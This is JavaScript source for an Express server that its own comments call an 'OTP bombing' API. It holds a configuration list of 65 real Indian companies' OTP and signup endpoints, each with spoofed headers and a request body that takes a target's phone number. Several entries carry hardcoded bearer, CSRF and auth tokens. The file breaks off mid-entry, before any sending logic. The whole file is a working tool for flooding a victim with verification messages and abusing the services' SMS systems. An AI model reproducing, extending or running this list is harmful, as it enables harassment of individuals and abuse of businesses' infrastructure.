// ============================================================
// api_server.js - OTP Bombing API Server (UNTESTED APIs ONLY)
// Sirf Nayi Untested APIs | 10min Cap | Logs | Delay
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// 🔥 CONFIGURATION
const MAX_DURATION_MIN = 10;
const BATCH_DELAY_MS = 100;
const API_DELAY_MS = 50;

// ============================================================
// ===== UNTESTED NAYI APIs =====
// ===== (Sirf woh APIs jo abhi tak test nahi hui) =====
// ============================================================

const APIS = [
    // 1. Splexxo Bomb
    {
        name: "Splexxo_Bomb",
        url: "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO",
        method: "GET",
        headers: {}
    },

    // 2. Jockey
    {
        name: "Jockey_NEW",
        url: "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
        method: "GET",
        headers: {
            "accept": "*/*",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "origin": "https://www.jockey.in",
            "referer": "https://www.jockey.in/"
        }
    },

    // 3. Redcliffe
    {
        name: "Redcliffe",
        url: "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        data: (phone) => JSON.stringify({ phone_number: phone, short: true, country_code: "+91", medium: "" })
    },

    // 4. Penpencil Resend
    {
        name: "Penpencil_Resend",
        url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "randomid": "42517571-2047-4b35-a6b9-c9b2687857f9",
            "origin": "https://www.pw.live",
            "referer": "https://www.pw.live/"
        },
        data: (phone) => JSON.stringify({ mobile: phone, organizationId: "5eb393ee95fab7468a79d189" })
    },

    // 5. CityMall (naya)
    {
        name: "CityMall_NEW",
        url: "https://citymall.live/api/cl-user/auth/get-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://citymall.live",
            "Referer": "https://citymall.live/"
        },
        data: (phone) => JSON.stringify({ phone_number: phone })
    },

    // 6. Licious
    {
        name: "Licious",
        url: "https://www.licious.in/api/login/signup",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://www.licious.in",
            "Referer": "https://www.licious.in/"
        },
        data: (phone) => JSON.stringify({ phone: phone, captcha_token: null })
    },

    // 7. Bisleri (naya)
    {
        name: "Bisleri_NEW",
        url: "https://apis.bisleri.com/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://www.bisleri.com",
            "Referer": "https://www.bisleri.com/"
        },
        data: (phone) => JSON.stringify({ email: "user1234@gmail.com", mobile: phone })
    },

    // 8. Penpencil Register
    {
        name: "Penpencil_Register",
        url: "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.pw.live",
            "randomid": "e66d7f5b-7963-408e-9892-839015a9c83f"
        },
        data: (phone) => JSON.stringify({ mobile: phone, countryCode: "+91", subOrgId: "SUB-PWLI000" })
    },

    // 9. Zoho
    {
        name: "Zoho",
        url: "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN&country=india",
        method: "POST",
        headers: {
            "Accept": "*/*",
            "Origin": "https://www.zoho.com",
            "Referer": "https://www.zoho.com/"
        }
    },

    // 10. UdyogPlus
    {
        name: "UdyogPlus",
        url: "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
        method: "POST",
        headers: {
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://udyogplus.adityabirlacapital.com",
            "Referer": "https://udyogplus.adityabirlacapital.com/signup-cobranded",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "MobileNumber={phone}&functionality=signup" }
    },

    // 11. MuthootFinance
    {
        name: "MuthootFinance",
        url: "https://www.muthootfinance.com/smsapi.php",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.muthootfinance.com",
            "referer": "https://www.muthootfinance.com/personal-loan",
            "x-requested-with": "XMLHttpRequest"
        },
        data: { "_raw": "mobile={phone}&pin=XjtYYEdhP0haXjo3" }
    },

    // 12. GoPaySense
    {
        name: "GoPaySense",
        url: "https://api.gopaysense.com/users/otp",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.gopaysense.com",
            "referer": "https://www.gopaysense.com/"
        },
        data: (phone) => JSON.stringify({ phone: phone })
    },

    // 13. IIFL
    {
        name: "IIFL",
        url: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1",
        method: "POST",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.iifl.com",
            "referer": "https://www.iifl.com/personal-loans",
            "x-requested-with": "XMLHttpRequest"
        },
        data: { "_raw": "apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1" }
    },

    // 14. BankOpen
    {
        name: "BankOpen",
        url: "https://v2-api.bankopen.co/users/register/otp",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://app.opencapital.co.in",
            "referer": "https://app.opencapital.co.in/en/onboarding/register",
            "x-api-version": "3.1",
            "x-client-type": "Web"
        },
        data: (phone) => JSON.stringify({ username: phone, is_open_capital: 1 })
    },

    // 15. TataCapital Retail
    {
        name: "TataCapital_Retail",
        url: "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.tatacapital.com",
            "referer": "https://www.tatacapital.com/"
        },
        data: (phone) => JSON.stringify({
            header: {
                authToken: "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==",
                identifier: "nli"
            },
            body: { mobileNumber: phone }
        })
    },

    // 16. Khatabook App
    {
        name: "Khatabook_App",
        url: "https://api.khatabook.com/v1/auth/request-otp",
        method: "POST",
        headers: {
            "x-kb-app-name": "khatabook",
            "x-kb-app-version": "801800",
            "x-kb-app-locale": "en",
            "x-kb-platform": "android",
            "Content-Type": "application/json; charset=UTF-8"
        },
        data: (phone) => JSON.stringify({ phone: phone, country_code: "+91", app_signature: "wk+avHrHZf2" })
    },

    // 17. OrangeHealth
    {
        name: "OrangeHealth",
        url: "https://accounts.orangehealth.in/api/v1/user/otp/generate/",
        method: "POST",
        headers: {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://www.orangehealth.in",
            "referer": "https://www.orangehealth.in/"
        },
        data: (phone) => JSON.stringify({ mobile_number: phone, customer_auto_fetch_message: true })
    },

    // 18. Jobhai
    {
        name: "Jobhai",
        url: "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json;charset=UTF-8",
            "device-id": "e97edd71-16a3-4835-8aab-c67cf5e21be1",
            "language": "en",
            "origin": "https://www.jobhai.com",
            "referer": "https://www.jobhai.com/",
            "source": "WEB",
            "x-transaction-id": "JS-WEB-abc123"
        },
        data: (phone) => JSON.stringify({ phone: phone })
    },

    // 19. Mconnect
    {
        name: "Mconnect",
        url: "https://mconnect.isteer.co/mconnect/login",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "app_platform": "mvaahna",
            "content-type": "application/json",
            "origin": "https://mvaahna.com",
            "referer": "https://mvaahna.com/"
        },
        data: (phone) => JSON.stringify({ mobile_number: "+91" + phone })
    },

    // 20. AstroSage
    {
        name: "AstroSage",
        url: "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank",
        method: "GET",
        headers: {
            "accept": "*/*",
            "referer": "https://www.astrosage.com/"
        }
    },

    // 21. Spinny
    {
        name: "Spinny",
        url: "https://api.spinny.com/api/c/user/otp-request/v3/",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "platform": "web",
            "origin": "https://www.spinny.com",
            "referer": "https://www.spinny.com/"
        },
        data: (phone) => JSON.stringify({ contact_number: phone, whatsapp: false, code_len: 4, "g-recaptcha-response": "" })
    },

    // 22. Dream11
    {
        name: "Dream11",
        url: "https://www.dream11.com/auth/passwordless/init",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "device": "pwa",
            "origin": "https://www.dream11.com",
            "referer": "https://www.dream11.com/register",
            "x-device-identifier": "macos"
        },
        data: (phone) => JSON.stringify({ channel: "sms", flow: "SIGNUP", phoneNumber: phone, templateName: "default" })
    },

    // 23. Freedo
    {
        name: "Freedo",
        url: "https://api.freedo.rentals/customer/sendOtpForSignUp",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://freedo.rentals",
            "platform": "web",
            "referer": "https://freedo.rentals/",
            "requestfrom": "customer",
            "x-bn": "2.0.16",
            "x-channel": "WEB",
            "x-client-id": "FREEDO",
            "x-platform": "CUSTOMER"
        },
        data: (phone) => JSON.stringify({ email_id: "cokiwav528@avastu.com", first_name: "Haiii", mobile_number: phone })
    },

    // 24. Cosmofeed
    {
        name: "Cosmofeed",
        url: "https://prod.api.cosmofeed.com/api/user/authenticate",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "cosmofeed-request-id": "fe247a51-c977-4882-a9b8-fe303692ddc3",
            "origin": "https://superprofile.bio",
            "referer": "https://superprofile.bio/"
        },
        data: (phone) => JSON.stringify({ phoneNumber: phone, countryCode: "+91", data: { email: "abcd2@gmail.com" }, authScreen: "signup-screen", userIsConvertingToCreator: false })
    },

    // 25. Evital
    {
        name: "Evital",
        url: "https://www.evitalrx.in:4000/v3/login/signup_sendotp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Referer": "https://pharmacy.evitalrx.in/"
        },
        data: (phone) => JSON.stringify({ pharmacy_name: "hfhfjfgfhkf", mobile: phone, referral_code: "", email_id: "jhvd@gmail.com", zip_code: "110086", device_id: "f2cea99f-381d-432d-bd27-02bc6678fa93", app_version: "desktop", device_name: "Chrome", device_model: "Mozilla/5.0", device_manufacture: "Windows", device_release: "windows-10", device_sdk_version: "126.0.0.0" })
    },

    // 26. Clovia
    {
        name: "Clovia",
        url: "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}&isSignUp=true&email=&is_otp=true&token",
        method: "GET",
        headers: {
            "accept": "application/json, text/plain, */*",
            "referer": "https://www.clovia.com/"
        }
    },

    // 27. Brevistay
    {
        name: "Brevistay",
        url: "https://www.brevistay.com/cst/app-api/login",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "authorization": "Bearer null",
            "brevi-channel": "DESKTOP_WEB",
            "brevi-channel-version": "40.0.0",
            "content-type": "application/json",
            "origin": "https://www.brevistay.com",
            "referer": "https://www.brevistay.com/login"
        },
        data: (phone) => JSON.stringify({ is_otp: 1, is_password: 0, mobile: phone })
    },

    // 28. HourlyRooms
    {
        name: "HourlyRooms",
        url: "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
        method: "POST",
        headers: {
            "Accept": "*/*",
            "content-type": "application/json",
            "platform": "web-2.0.0",
            "Origin": "https://hourlyrooms.co.in"
        },
        data: (phone) => JSON.stringify({ phone: phone })
    },

    // 29. 55Club
    {
        name: "55Club",
        url: "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://55club08.in",
            "referer": "https://55club08.in/"
        },
        data: (phone) => JSON.stringify({ phone: "91" + phone, codeType: 1, language: 0, random: "35ae48f136d74b279dbd0eeb2504e7f8", signature: "78A2879A0D46B65D257F9B29354B5DBA", timestamp: 1715445820 })
    },

    // 30. Zerodha
    {
        name: "Zerodha",
        url: "https://zerodha.com/account/registration.php",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://zerodha.com",
            "referer": "https://zerodha.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone, source: "zerodha", partner_id: "" })
    },

    // 31. Aakash Anthe
    {
        name: "Aakash_Anthe",
        url: "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.aakash.ac.in",
            "referer": "https://www.aakash.ac.in/",
            "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763"
        },
        data: (phone) => JSON.stringify({ mobile_psid: phone, mobile_number: "", activity_type: "aakash-myadmission", webengageData: { profile: "student", whatsapp_opt_in: true, method: "mobile" } })
    },

    // 32. Medibuddy
    {
        name: "Medibuddy",
        url: "https://loginprod.medibuddy.in/unified-login/user/register",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://www.medibuddy.in",
            "referer": "https://www.medibuddy.in/"
        },
        data: (phone) => JSON.stringify({ source: "medibuddyInWeb", platform: "medibuddy", phonenumber: phone, flow: "Retail-Login-Home-Flow", idealLoginFlow: false, advertiserId: "3893d117-b321-Lba9-815e-db63c64b112a", mbUserId: null })
    },

    // 33. Wrogn
    {
        name: "Wrogn",
        url: "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp",
        method: "POST",
        headers: {
            "accept": "*/*",
            "action": "sendOTP",
            "content-type": "application/json",
            "origin": "https://wrogn.com",
            "referer": "https://wrogn.com/",
            "shop_name": "wrogn-website.myshopify.com"
        },
        data: (phone) => JSON.stringify({ username: "+91" + phone, type: "mobile", domain: "wrogn.com", recaptcha_token: "" })
    },

    // 34. Medkart
    {
        name: "Medkart",
        url: "https://app.medkart.in/api/v1/auth/requestOTP?uuid=f9e75a95-e172-4922-b69c-08e1e3be9f1b",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "app-platform": "web",
            "authorization": "Bearer",
            "content-type": "application/json",
            "device_id": "6641194520998",
            "langcode": "en",
            "origin": "https://www.medkart.in",
            "referer": "https://www.medkart.in/"
        },
        data: (phone) => JSON.stringify({ mobile_no: phone })
    },

    // 35. Mamaearth
    {
        name: "Mamaearth",
        url: "https://auth.mamaearth.in/v1/auth/initiate-signup",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json;charset=UTF-8",
            "isweb": "true",
            "origin": "https://mamaearth.in",
            "referer": "https://mamaearth.in/"
        },
        data: (phone) => JSON.stringify({ mobile: phone, referralCode: "" })
    },

    // 36. LoveLocal
    {
        name: "LoveLocal",
        url: "https://homedeliverybackend.mpaani.com/auth/send-otp",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en",
            "client-code": "vulpix",
            "content-type": "application/json",
            "origin": "https://www.lovelocal.in",
            "referer": "https://www.lovelocal.in/"
        },
        data: (phone) => JSON.stringify({ phone_number: phone, role: "CUSTOMER" })
    },

    // 37. Tyreplex
    {
        name: "Tyreplex",
        url: "https://www.tyreplex.com/includes/ajax/gfend.php",
        method: "POST",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.tyreplex.com",
            "Referer": "https://www.tyreplex.com/login",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "perform_action=sendOTP&mobile_no={phone}&action_type=order_login" }
    },

    // 38. Moglix
    {
        name: "Moglix",
        url: "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://www.moglix.com",
            "referer": "https://www.moglix.com/"
        },
        data: (phone) => JSON.stringify({ email: "", phone: phone, type: "p", source: "signup", buildVersion: "DESKTOP-7.3", device: "desktop" })
    },

    // 39. Upgrad
    {
        name: "Upgrad",
        url: "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "client": "web",
            "content-type": "application/json",
            "course": "general-interest",
            "origin": "https://www.upgrad.com",
            "referer": "https://www.upgrad.com/"
        },
        data: (phone) => JSON.stringify({ phoneNumber: "+91" + phone })
    },

    // 40. Xylem
    {
        name: "Xylem",
        url: "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        method: "POST",
        headers: {
            "client-version": "300",
            "Authorization": "Bearer",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://www.xylem.live/",
            "randomId": "bfc4e54e-1873-48cc-823e-40d401d9dbb4",
            "client-id": "64254d66be2a390018e6d348",
            "client-type": "WEB"
        },
        data: (phone) => JSON.stringify({ mobile: phone, countryCode: "+91", firstName: "Anant Ambani" })
    },

    // 41. NoBroker OTP
    {
        name: "NoBroker_OTP",
        url: "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.nobroker.in",
            "referer": "https://www.nobroker.in/"
        },
        data: { "_raw": "phone=%2B91{phone}" }
    },

    // 42. Vidyakul New
    {
        name: "Vidyakul_New",
        url: "https://vidyakul.com/signup-otp/send",
        method: "POST",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://vidyakul.com",
            "referer": "https://vidyakul.com/class-12th/test-series",
            "x-csrf-token": "el0GIsHQSO3Y4upLoQOm3coVWNEiNtiKJONg2LJx",
            "x-requested-with": "XMLHttpRequest"
        },
        data: { "_raw": "phone={phone}" }
    },

    // 43. Vedantu New
    {
        name: "Vedantu_New",
        url: "https://user.vedantu.com/user/preLoginVerification",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.vedantu.com",
            "referer": "https://www.vedantu.com/register"
        },
        data: (phone) => JSON.stringify({ email: null, phoneCode: "+91", phoneNumber: phone, sType: "VEDANTU_F_7_N", sValue: "FC34EE3ED23399CD7622BA1851D3E", token: "5nXaR2BzqApBb3Wf", ver: "1772629389", version: 2, whatsappCommunicationEnabled: false })
    },

    // 44. Unacademy
    {
        name: "Unacademy",
        url: "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://unacademy.com",
            "referer": "https://unacademy.com/login?redirectTo=%2Fsettings",
            "x-platform": "0"
        },
        data: (phone) => JSON.stringify({ phone: phone, country_code: "IN", otp_type: 1, email: "", send_otp: true, is_un_teach_user: false })
    },

    // 45. Flipkart New
    {
        name: "Flipkart_New",
        url: "https://2.rome.api.flipkart.com/api/7/user/otp/generate",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.flipkart.com",
            "referer": "https://www.flipkart.com/",
            "x-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 FKUA/website/42/website/Desktop"
        },
        data: (phone) => JSON.stringify({ loginId: "+91" + phone })
    },

    // 46. HDFC Ergo
    {
        name: "HDFC_Ergo",
        url: "https://here.co.in/users/v1/customer-portal/send-otp",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "cache-control": "no-cache",
            "content-type": "application/json",
            "origin": "https://www.hdfcergo.com",
            "referer": "https://www.hdfcergo.com/",
            "x-api-client": "Website",
            "x-app-version-code": "182",
            "x-origin": "https://sh.hdfcergo.com"
        },
        data: (phone) => JSON.stringify({ mobile: phone, source: "sms" })
    },

    // 47. AstroYogi
    {
        name: "AstroYogi",
        url: "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzcyOTg5NjQ0LCJleHAiOjE3ODA3NjU2NDR9.",
            "content-type": "application/json",
            "origin": "https://www.astroyogi.com",
            "referer": "https://www.astroyogi.com/registration/login.aspx"
        },
        data: (phone) => JSON.stringify({ PhoneNumber: phone, PhoneCode: "91", Domain: "Web", CountryId: "IN", IpAddress: "47.9.35.166", CountryCodeByHeader: "IN" })
    },

    // 48. Testbook
    {
        name: "Testbook",
        url: "https://api.testbook.com/api/v2/mobile/signup?mobile={phone}&clientId=1063568644.1772990508&sessionId=1772990507",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://testbook.com",
            "referer": "https://testbook.com/",
            "x-tb-client": "web,1.2"
        },
        data: (phone) => JSON.stringify({ firstVisitSource: { type: "organic", utm_source: "google", utm_medium: "organic", timestamp: "2026-03-08T17:21:46.000Z", entrance: "https://testbook.com/login", referralUrl: "https://www.google.com/" }, mobile: phone, signupDetails: { page: "HomePage", pagePath: "/", pageType: "HomePage" }, signupSource: { type: "organic", utm_source: "google", utm_medium: "organic", timestamp: "2026-03-08T17:25:36.000Z", entrance: "https://testbook.com/login", referralUrl: "https://www.google.com/" } })
    },

    // 49. IndiaMart
    {
        name: "IndiaMart",
        url: "https://m.indiamart.com/ajaxrequest/identified/common/login",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://m.indiamart.com",
            "referer": "https://m.indiamart.com/login/"
        },
        data: (phone) => JSON.stringify({ GEOIP_COUNTRY_ISO: "IN", IP: "47.9.35.50", IPADDRESS: "47.9.35.50", IP_COUNTRY: "India", ciso: "IN", duplicateEmailCheck: "", glid: "", glusr_usr_ip: "47.9.35.50", originalreferer: "https://m.indiamart.com/login/", pass: "", ph_code: "91", use: phone })
    },

    // 50. RelianceRetail
    {
        name: "RelianceRetail",
        url: "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp",
        method: "POST",
        headers: {
            "accept": "application/json",
            "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXR1cm5fdWlfdXJsIjoid3d3Lmppb21hcnQuY29tL2N1c3RvbWVyL2FjY291bnQvbG9naW4_bXNpdGU9eWVzIiwiY2xpZW50X2lkIjoiZmRiNjQ2ZWEtZTcwOC00NzI1LWE5NTMtMjI4ZmExY2I4MzU1IiwiaWF0IjoxNzczMzE3Nzg4LCJzYWx0IjowfQ.DLFEXcyozGInRiLn3U2dTGQEwTog6UYc3WP62ujmJGY",
            "content-type": "application/json",
            "origin": "https://account.relianceretail.com",
            "referer": "https://account.relianceretail.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },

    // 51. Apna
    {
        name: "Apna",
        url: "https://production.apna.co/api/userprofile/v1/otp/",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://employer.apna.co",
            "referer": "https://employer.apna.co/"
        },
        data: (phone) => JSON.stringify({ phone_number: "91" + phone, retries: 0, hash_type: "employer", source: "employer" })
    },

    // 52. LoanZap
    {
        name: "LoanZap",
        url: "https://webapi.loanzap.in/v2/apply-loan/register-user",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "origin": "https://www.loanzap.in",
            "referer": "https://www.loanzap.in/"
        },
        data: (phone) => JSON.stringify({ name: "Binod", mobile: phone, email: "test@gmail.com", terms: "1", utm_source: "", utm_campaign: "" })
    },

    // 53. RupeeLending
    {
        name: "RupeeLending",
        url: "https://rupeelending.com/apply-now/send-otp",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "origin": "https://rupeelending.com",
            "referer": "https://rupeelending.com/apply-now"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },

    // 54. NexiLoans
    {
        name: "NexiLoans",
        url: "https://api-backend.nexiloans.com/user/otp/send",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "authorization": "Bearer null",
            "origin": "https://apply.nexiloans.com",
            "referer": "https://apply.nexiloans.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },

    // 55. Rupee4u
    {
        name: "Rupee4u",
        url: "https://loanapply.rupee4u.com/api/login",
        method: "POST",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://loanapply.rupee4u.com",
            "Referer": "https://loanapply.rupee4u.com/auth"
        },
        data: (phone) => JSON.stringify({ mobile: phone, captchaKey: null })
    },

    // 56. Creditt
    {
        name: "Creditt",
        url: "https://prod-v4-app-api.credittapi.com/app/auth/mobile/otp/sent",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "authorization": "Bearer null",
            "appStore": "web_app",
            "api_version": "1.0",
            "deviceId": "device_abc123",
            "trackingId": "tracking_abc123",
            "appVersion": "1.0.21",
            "platform": "3",
            "Origin": "https://loan.credittnow.com",
            "Referer": "https://loan.credittnow.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },

    // 57. FundsBull
    {
        name: "FundsBull",
        url: "https://backend.fundsbull.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://fundsbull.com",
            "Referer": "https://fundsbull.com/"
        },
        data: (phone) => JSON.stringify({ phone_number: phone })
    },

    // 58. RupeeRedee
    {
        name: "RupeeRedee",
        url: "https://webservice-in-prod.rupeeredee.com/gate/api/v1/OTP",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "applicationid": "",
            "deviceid": "abc-uuid",
            "platform": "Web",
            "origin": "https://www.rupeeredee.com",
            "referer": "https://www.rupeeredee.com/"
        },
        data: (phone) => JSON.stringify({ number: "+91" + phone, type: "Mobile" })
    },

    // 59. PaisaInTime
    {
        name: "PaisaInTime",
        url: "https://micro-server-for-paisaintime-nrbe5.ondigitalocean.app/api/auth/get_otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "client-id": "08b61f94-4e99-4d4e-abe9-108a1078bbdb",
            "origin": "https://www.paisaintime.com",
            "referer": "https://www.paisaintime.com/"
        },
        data: (phone) => JSON.stringify({ phoneNo: phone, clientId: "08b61f94-4e99-4d4e-abe9-108a1078bbdb" })
    },

    // 60. FastPaise
    {
        name: "FastPaise",
        url: "https://backend.fastpaise.in/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://fastpaise.in",
            "Referer": "https://fastpaise.in/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone })
    },

    // 61. DuniyaFinance
    {
        name: "DuniyaFinance",
        url: "https://backend.duniyafinance.in/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://duniyafinance.com",
            "Referer": "https://duniyafinance.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone })
    },

    // 62. BlinkrLoan
    {
        name: "BlinkrLoan",
        url: "https://backend.blinkrloan.com/api/user/v3/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "withCredentials": "true",
            "Origin": "https://www.blinkrloan.com",
            "Referer": "https://www.blinkrloan.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone, lat: "26.123456", lng: "77.123456", url: "https://www.blinkrloan.com/apply/pan-mobile" })
    },

    // 63. NaukriLoans
    {
        name: "NaukriLoans",
        url: "https://backend.naukriloans.com/api/user/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://naukriloans.com",
            "Referer": "https://naukriloans.com/"
        },
        data: (phone) => JSON.stringify({ PAN: "ABCDE1234F", phone_number: phone })
    },

    // 64. UdharCapital
    {
        name: "UdharCapital",
        url: "https://www.udharcapital.com/api/send_otp.php",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://www.udharcapital.com",
            "referer": "https://www.udharcapital.com/apply-loan.php?slug=personal-loan"
        },
        data: { "_raw": "phone={phone}" }
    },

    // 65. SalaryBolt
    {
        name: "SalaryBolt",
        url: "https://backend.salarybolt.com/api/user/send-otp",
        method: "POST",
        headers: {
